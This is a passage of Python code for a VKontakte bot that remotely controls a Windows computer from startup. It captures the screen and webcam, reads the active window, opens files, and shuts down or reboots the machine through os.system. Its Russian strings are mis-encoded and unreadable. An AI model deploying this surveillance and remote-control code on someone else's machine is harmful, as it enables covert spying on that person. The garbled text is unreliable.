                    if event.text.lower()=="–ø—Ä–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ú–µ–Ω—é —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞:')
                        

                    if event.text.lower()=="—Å–ª–µ–¥. —Å—Ç—Ä–∞–Ω–∏—Ü–∞":
                        if new_list_status==True:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard2.get_keyboard(),message='—Å—Ç—Ä–∞–Ω–∏—Ü–∞ 2:')
                        else:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –Ω–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –µ—â—ë –Ω–µ –¥–æ–±–∞–≤–ª–µ–Ω—ã &#128549;')

                    if event.text.lower()=="—Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=system_board.get_keyboard(),message='–°–∏—Å—Ç–µ–º–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞:')
                        
                    if event.text.lower()=="–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='–û—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é:')
                        new_list_status=False

                    if event.text.lower()=="—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞":      
                        with open(appdata_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message=f'–ù–∞–∑–≤–∞–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {USER_NAME}\n{platform.uname()}\n–ö–æ–ª-–≤–æ –≤–∫–ª—é—á–µ–Ω–∏–π –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: {json.load(file)["turn_on"]} \n –≤—Ä–µ–º—è –Ω–∞—á–∞–ª–∞ —Å–µ–∞–Ω—Å–∞: {time_now}, –≤—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {working_time(start_time)} ')
                            
                    if event.text.lower()=="–≤—ã–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è":                        
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=system_notification_board.get_keyboard(),message='–ù–∞ –∫–∞–∫–æ–µ –≤—Ä–µ–º—è –í—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è?')                
                        longpoll=VkLongPoll(vk_session)
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="–Ω–∞–∑–∞–¥":
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=system_board.get_keyboard(),message='–ò–∑–º–µ–Ω–µ–Ω–∏—è –Ω–µ –±—ã–ª–∏ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω—ã')
                                    break                        
                                elif event.text.lower()=="–Ω–∞ –≤—Ä–µ–º—è":
                                    vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=system_notification_board.get_keyboard(),message='–ü–æ–∫–∞ —á—Ç–æ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ –Ω–∞ –≤—Ä–µ–º—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ.–í—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π –≤–∞—Ä–∏–∞–Ω—Ç')                
                                    
                                
                                    #—Ä–∞–±–æ—Ç–∞ —Å –≤—Ä–µ–º–µ–Ω–µ–º
                                elif event.text.lower()=='–Ω–∞–≤—Å–µ–≥–¥–∞':
                                    write_msg(profile_id,'''–í—ã –≤—Å–µ–≥–¥–∞ —Å–º–æ–∂–µ—Ç–µ –≤–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è.–í–∞–º –≤—Å–µ–≥–æ –ª–∏—à—å –Ω–∞–¥–æ –≤–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥–æ–≤–æ–µ —Å–ª–æ–≤–æ "–≤–∫–ª—é—á–∏—Ç—å",–ø–æ—Å–ª–µ —á–µ–≥–æ –í–∞–º —Å–Ω–æ–≤–∞ —Å—Ç–∞–Ω—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è''')
                                              
                                    try:
                                        person_info=[]
                                        name_1=getUserName(profile_id)[0]
                                        name_2=getUserName(profile_id)[1]
                                        profile_ids=str(getUserId(profile_id))
                                        notification_status=False
                                        with open(appdata_path) as file:
                                            times=json.load(file)["turn_on"]
                                            
                                        info_list={
                                            'notification_status':notification_status,
                                            'first_name':name_1,
                                            'second_name':name_2,
                                            'profile_id':profile_ids,
                                            'turn_on':times
                                        
                                            }
                                                       
                                        person_info.append(info_list)
                                        with open(appdata_path,"w") as file:
                                            json.dump(info_list,file,indent=2,ensure_ascii=False)#–∑–∞–ø–∏—Å—å id –≤ .json
                                        
                                    except Exception as a:
                                        write_msg(profile_id,a)

                                    else:
                                        write_msg(profile_id,"—É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –±—ã–ª–∏ —É—Å–ø–µ—à–Ω–æ –≤—ã–∫–ª—é—á–µ–Ω—ã")
                                        exit(0)
                                else:
                                    write_msg(profile_id,"–≤—ã–±–µ—Ä–∏—Ç–µ –æ–¥–∏–Ω –∏–∑ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω—ã—Ö –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤")
                                 
                                    
                    #######################################
                    if event.text.lower()=="–ø–µ—Ä–µ–∑–∞–ø–∏—Å—å id":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤ –≤–∫ –∏–ª–∏ id —Å—Ç—Ä–∞–Ω–∏—Ü—ã: ')                
                        longpoll=VkLongPoll(vk_session)
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="–Ω–∞–∑–∞–¥":
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ò–∑–º–µ–Ω–µ–Ω–∏—è –Ω–µ –±—ã–ª–∏ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω—ã')
                                    break                        
                                else:
                                    profilee_id=event.text.lower()        
                                    try: 
                                        getUserId(profilee_id)                                    
                                    except Exception:   
                                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='–í–≤–µ–¥—ë–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π id')  
                                        break

                                    else:
                                        try:
                                            person_info=[]  
                                            full_name=getUserName(getUserId(event.text.lower()))      
                                            profile_new_id=getUserId(event.text.lower())
                                            if int(profile_id)==int(profile_new_id):
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='–í–≤–µ–¥—ë–Ω —Ç–µ–∫—É—â–∏–π id –í–∞—à–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã')
                                                break

                                            else:
                                                notification_status=True
                                                info_list={
                                                    'notification_status':notification_status,
                                                    'first_name':full_name[0],
                                                    'second_name':full_name[1],
                                                    'profile_id':str(profile_new_id),
                                                    'turn_on':0
                                                
                                                    }
                                            
                                                person_info.append(info_list)                                    
                                                with open(appdata_path,"w") as file1:
                                                    json.dump(info_list,file1,indent=2,ensure_ascii=False)#–∑–∞–ø–∏—Å—å id –≤ .json
                                                vk.messages.send(peer_id=getUserId(event.text.lower()),random_id=get_random_id(),keyboard=static_board.get_keyboard(),message="–≠—Ç–æ –≥—Ä—É–ø–ø–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ç–≤–æ–∏–º –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º! \n–¢–µ–ø–µ—Ä—å –ø—Ä–∏ –∫–∞–∂–¥–æ–º –≤–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞ —Ç–µ–±–µ –±—É–¥–µ—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ.\n–ë–æ—Ç–∞ —Ç—ã –≤—Å–µ–≥–¥–∞ –º–æ–∂–µ—à—å –æ—Ç–∫–ª—é—á–∏—Ç—å –≤–æ –≤–∫–ª–∞–¥–∫–µ '—Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏', –∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Ç–µ–±–µ –ø—Ä–∏–¥—ë—Ç —É–∂–µ –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º –≤–∫–ª—é—á–µ–Ω–∏–∏:)")
                                                exit(0)
                                                
                                        except Exception as a:
                                            pass
                                        
                                 
                    if event.text.lower()=="—Å–æ–∑–¥–∞–Ω–∏–µ –æ–∫–Ω–∞":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –æ–∫–Ω–∞')               
                        longpoll=VkLongPoll(vk_session)                
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="–Ω–∞–∑–∞–¥":                            
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–û–∫–Ω–æ –Ω–µ –±—ã–ª–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ')
                                    break
                                else:
                                    root_thread = threading.Thread(target=msg_root, args=(event,))
                                    #msg_root(event)
                                    sound_error_thread = threading.Thread(target=local_sound_error)
                                    sound_error_thread.start()
                                    root_thread.start()
                                    time.sleep(1)
                                    vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'–±—ã–ª–æ —Å–æ–∑–¥–∞–Ω–æ –æ–∫–Ω–æ —Å —Ç–µ–∫—Å—Ç–æ–º: {event.text.lower()}')
                                    break
                      
                    ######################################        
                    if event.text.lower()=="–≥—É–¥–æ–∫":
                        try:     
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≥—É–¥–∫–∞:')               
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="–Ω–∞–∑–∞–¥":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ó–≤—É–∫–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –Ω–µ –±—ã–ª–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ')
                                        break
                                    else:                                        
                                        try:
                                            if int(event.text.lower())<=10 and int(event.text.lower())>0:
                                                winsound.Beep(500,int(event.text.lower())*1000)
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'–ë—ã–ª –ø—Ä–æ–∏–∑–≤–µ–¥—ë–Ω –≥—É–¥–æ–∫ —Å –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å—é: {event.text.lower()} —Å–µ–∫.')

                                            elif int(event.text.lower())<0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'–í—Ä–µ–º—è {event.text.lower()} –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º!')

                                            elif int(event.text.lower())==0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–í—Ä–µ–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω—É–ª–µ–≤—ã–º!')
                                            else:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ì—É–¥–∫–∏ –±–æ–ª—å—à–µ 10 —Å–µ–∫. –±–æ—Ç –Ω–µ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç!')
                                        except ValueError:
                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–í—ã –≤–≤–µ–ª–∏ –Ω–µ —á–∏—Å–ª–æ!')
                                        
                                        break
                                    
                        except Exception:
                            error_msg(profile_id)
                           

                    if event.text.lower()=="–≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞":
                        try:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –≤–æ–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è:')
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="–Ω–∞–∑–∞–¥":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ö–æ–º–ø—å—é—Ç–µ—Ä –Ω–µ –±—ã–ª –≤—ã–∫–ª—é—á–µ–Ω')
                                        break
                                    else:
                                        try:
                                            text_speaker(event.text)

                                        except:
                                            print("eeeeee")

                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–¢–µ–∫—Å—Ç –±—ã–ª —É—Å–ø–µ—à–Ω–æ –≤–æ–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω')


                                    break

                        except:
                            pass
                        
                        

                    if event.text.lower()=="–æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–í –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –æ—Ç–∫—Ä—ã—Ç –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –∫ —Ñ–∞–π–ª–∞–º —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞,–≤—ã–±–µ—Ä–∏—Ç–µ —Ñ–∞–π–ª –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è:')
                        time.sleep(1.2)
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_files.get_keyboard(),message=get_exe())

                        longpoll=VkLongPoll(vk_session)                
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="–Ω–∞–∑–∞–¥":                            
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–û—Ç–∫—Ä—ã—Ç–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ')
                                    break
                                else:
                                    try:
                                        #keyboard_creation(get_exe())
                                        opening=threading.Thread(target=file_opening,args=(event.text.lower(),))
                                        opening.start()


                                    except Exception as b:
                                        print(b)

                                    else:
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'—Ñ–∞–π–ª {event.text.lower()} –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç')

                                        break#exit
                                    


                    if event.text.lower()=="—Å–∫—Ä–∏–Ω—à–æ—Ç":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è, –æ–∂–∏–¥–∞–π—Ç–µ...')
                        try:
                            screenshot()
                        except Exception: 
                            try:
                                screenshot()
                            except Exception:
                                error_msg(profile_id)                                             

                        
                    if event.text.lower()=="–∫–∞–º–µ—Ä–∞":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è, –æ–∂–∏–¥–∞–π—Ç–µ...')
                        try:
                            camera()
                        except Exception:
                            try:
                                camera()
                            except Exception as a:      
                                print(a)

                    if event.text.lower()=="–∞–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è":
                        try:
                            vk.messages.send(peer_id=event.user_id,random_id=get_random_id(),message=GetWindowText(GetForegroundWindow()))
                    
                        except Exception:
                            pass
                            
                    if event.text.lower()=="–º–æ–Ω–∏—Ç–æ—Ä —Ä–µ—Å—É—Ä—Å–æ–≤":
                        vk.messages.send(peer_id=event.user_id,random_id=get_random_id(),message="–ü–æ–∂–∞–ª—É–π—Å—Ç–∞,–ø–æ–¥–æ–∂–¥–∏—Ç–µ 10 —Å–µ–∫—É–Ω–¥...")
                        
                        resurs_monitor()
                        

                    if event.text.lower()=="–ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞":
                        try:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–ß–µ—Ä–µ–∑ —Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –í—ã —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ? ')               
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="–Ω–∞–∑–∞–¥":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ö–æ–º–ø—å—é—Ç–µ—Ä –Ω–µ –±—ã–ª –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω')
                                        break
                                    else:
                                        try:
                                            eventik=event.text.lower()
                                            eventik=int(eventik)

                                        except ValueError:
                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'{event.text.lower()} - —ç—Ç–æ –Ω–µ —á–∏—Å–ª–æ!')
                                            break
                                        
                                        else:
                                            if eventik<0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="–í—Ä–µ–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º")
                                                break
                                            
                                            elif eventik>36000:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_yes_no.get_keyboard(),message=f'–í—ã —Ç–æ—á–Ω–æ —É–≤–µ—Ä–µ–Ω—ã,—á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —á–µ—Ä–µ–∑ {eventik} —Å–µ–∫—É–Ω–¥?')               
                                                longpoll=VkLongPoll(vk_session)                
                                                for event in longpoll.listen():
                                                    if event.type==VkEventType.MESSAGE_NEW:
                                                        if event.text.lower()=="–Ω–µ—Ç":                            
                                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ö–æ–º–ø—å—é—Ç–µ—Ä  –Ω–µ –±—ã–ª –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω')
                                                            break
                                                        
                                                        else:
                                                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="–ö–æ–º–ø—å—é—Ç–µ—Ä –±—É–¥–µ—Ç —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω:)")
                                                            os.system(f'shutdown /r /t {eventik}')
                                                            break

                                            elif eventik<36000 and eventik>0:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="–ö–æ–º–ø—å—é—Ç–µ—Ä –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω:)")
                                                os.system(f'shutdown /r /t {eventik}')
                                                break

                                            else:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="—á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫")    
                                                break

                                            break
                        except Exception:
                            error_msg(profile_id)


    
                    if event.text.lower()=="–≤—ã–∫–ª—é—á–µ–Ω–∏–µ":
                        try:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='–ß–µ—Ä–µ–∑ —Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –í—ã —Ö–æ—Ç–∏—Ç–µ –≤—ã–∫–ª—é—á–∏—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ? ')               
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="–Ω–∞–∑–∞–¥":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ö–æ–º–ø—å—é—Ç–µ—Ä –Ω–µ –±—ã–ª –≤—ã–∫–ª—é—á–µ–Ω')
                                        break
                                    else:
                                        try:
                                            eventik=event.text.lower()
                                            eventik=int(eventik)

                                        except ValueError:
                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'{event.text.lower()} - —ç—Ç–æ –Ω–µ —á–∏—Å–ª–æ!')
                                            break
                                        
                                        else:
                                            if eventik<0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="–í—Ä–µ–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º")
                                                break
                                            
                                            elif eventik>36000:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_yes_no.get_keyboard(),message=f'–í—ã —Ç–æ—á–Ω–æ —É–≤–µ—Ä–µ–Ω—ã,—á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∫–ª—é—á–∏—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —á–µ—Ä–µ–∑ {eventik} —Å–µ–∫—É–Ω–¥?')               
                                                longpoll=VkLongPoll(vk_session)                
                                                for event in longpoll.listen():
                                                    if event.type==VkEventType.MESSAGE_NEW:
                                                        if event.text.lower()=="–Ω–µ—Ç":                            
                                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω –Ω–µ –±—ã–ª')
                                                            break
                                                        
                                                        else:
                                                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="–ö–æ–º–ø—å—é—Ç–µ—Ä –±—É–¥–µ—Ç —É—Å–ø–µ—à–Ω–æ –≤—ã–∫–ª—é—á–µ–Ω:)")
                                                            os.system(f'shutdown -s -t {eventik}')
                                                            break

                                            elif eventik<36000 and eventik>0:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="–ö–æ–º–ø—å—é—Ç–µ—Ä —É—Å–ø–µ—à–Ω–æ –≤—ã–∫–ª—é—á–µ–Ω:)")
                                                os.system(f'shutdown -s -t {eventik}')
                                                break

                                            else:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="—á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫")    
                                                break

                                            break
                        except Exception:
                            error_msg(profile_id)
                            
            except ConnectionError:
                print("errr")
                
                
#main code


def main_control():
    import requests
    time_codes=0
    loop_status=True
    while loop_status==True:
        if time_codes>=15:
            sys.exit("time connection error")
            break
        
        try:
            response = requests.get("http://www.google.com")
            time.sleep(5)
            
        except requests.ConnectionError:
            time.sleep(5)
            time_codes+=1
            print("no_connection")

        else:
            loop_status=False#–Ω–∞–¥–æ
            USER_NAME = getpass.getuser()
            redirect="recover.json"
            file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
            json_path=f"{file_path}\{redirect}"#link to .json file
            
            try:
                with open(json_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                    not_stat=json.load(file)['notification_status']
                
                with open(json_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                    token=json.load(file)['token']

                with open(json_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                    id_admin=json.load(file)['id_admin']

                with open(json_path) as file:#–ø—É—Ç—å –¥–æ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                    turn_on=json.load(file)['turn_on']
                    
                if not_stat == True:
                    print("notify on")
                    a = threading.Thread(target=main, args=(token,id_admin,turn_on,))
                    a.start()
                else:
                    print("notify off")
                    b = threading.Thread(target=secondary_main, args=(token,id_admin,turn_on,))
                    b.start()

            except FileNotFoundError:
                print("–Ω–µ–∞–µ–∞–Ωno such file in startup")

                
    


main_control()
    
    
